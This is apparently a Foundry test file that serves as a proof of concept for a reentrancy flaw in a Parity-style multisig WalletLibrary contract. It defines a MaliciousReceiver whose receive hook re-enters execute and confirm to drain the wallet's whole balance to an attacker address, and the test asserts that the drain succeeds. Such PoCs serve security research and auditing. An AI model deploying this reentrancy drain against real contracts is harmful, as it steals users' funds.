// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_2.sol";

contract MaliciousReceiver {
    WalletLibrary public wallet;
    address public attacker;
    uint public reentrancyCount;
    bytes32 public drainOpHash;

    constructor(WalletLibrary _wallet, address _attacker) {
        wallet = _wallet;
        attacker = _attacker;
    }

    receive() external payable {
        if (reentrancyCount == 0) {
            reentrancyCount++;
            
            // Create transaction to drain ALL remaining funds
            uint remainingFunds = address(wallet).balance;
            drainOpHash = wallet.execute(
                attacker,
                remainingFunds,
                ""
            );
            
            // Immediately confirm the drain transaction
            wallet.confirm(drainOpHash);
        }
    }
}

contract WalletLibraryReentrancyTest is Test {
    WalletLibrary public wallet;
    MaliciousReceiver public malicious;
    address public attacker = address(0xABC);
    address public otherOwner = address(0xDEF);
    address[] owners;

    function setUp() public {
        // Deploy wallet and malicious contract
        wallet = new WalletLibrary();
        malicious = new MaliciousReceiver(wallet, attacker);

        // Set owners: attacker + malicious contract + additional owner
        owners = new address[](3);
        owners[0] = attacker;
        owners[1] = address(malicious);
        owners[2] = otherOwner;

        // Initialize wallet with owners (only 1 confirmation required)
        wallet.initWallet(owners, 1, 0);

        // Fund wallet with 10 ETH
        vm.deal(address(wallet), 10 ether);
        
        // Provide attacker with 0.1 ETH for gas
        vm.deal(attacker, 0.1 ether);
    }

    function testReentrantDrain() public {
        // Record initial balances BEFORE critical actions
        console2.log("--- BEFORE-Trigger Balances ---");
        uint walletBalanceBefore = address(wallet).balance;
        uint maliciousBalanceBefore = address(malicious).balance;
        uint attackerBalanceBefore = attacker.balance;
        console2.log("Wallet balance:", walletBalanceBefore);
        console2.log("Malicious contract balance:", maliciousBalanceBefore);
        console2.log("Attacker balance:", attackerBalanceBefore);

        // Step 1: Create transaction to malicious contract (1 ETH)
        vm.prank(attacker);
        console2.log("--- Trigger Transaction Initialization ---");
        bytes32 initOpHash = wallet.execute(address(malicious), 1 ether, "");

        console2.log("--- Trigger Confirmation (exploit) ---");
        // Step 2: Confirm transaction - triggers reentrancy
        vm.prank(attacker);
        wallet.confirm(initOpHash);

        // Record balances AFTER critical actions
        console2.log("--- AFTER-Trigger Balances ---");
        uint walletBalanceAfter = address(wallet).balance;
        uint maliciousBalanceAfter = address(malicious).balance;
        uint attackerBalanceAfter = attacker.balance;
        console2.log("Wallet balance:", walletBalanceAfter);
        console2.log("Malicious contract balance:", maliciousBalanceAfter);
        console2.log("Attacker balance:", attackerBalanceAfter);

        // Vulnerability verification based on differential state
        bool drained = walletBalanceAfter == 0;
        bool maliciousReceived = maliciousBalanceAfter == 1 ether;
        bool attackerReceived = attackerBalanceAfter == 9.1 ether;
        
        console2.log("\n[State Verification]");
        console2.log("Wallet fully drained?", drained ? "YES" : "NO");
        console2.log("Malicious received 1 ETH?", maliciousReceived ? "YES" : "NO");
        console2.log("Attacker received 9 ETH?", attackerReceived ? "YES" : "NO");

        // Final vulnerability verdict
        if (drained && maliciousReceived && attackerReceived) {
            console2.log("Vulnerability Exists: Wallet drained through reentrancy");
        } else {
            console2.log("Vulnerability not Exist: Balances did not change as expected");
        }
        
        // Existing balance assertions maintain original verification
        assertEq(address(wallet).balance, 0, "Wallet funds not drained");
        assertEq(address(malicious).balance, 1 ether, "Malicious contract didn't receive initial amount");
        assertEq(attacker.balance, 9.1 ether, "Attacker didn't receive drained funds");
    }
}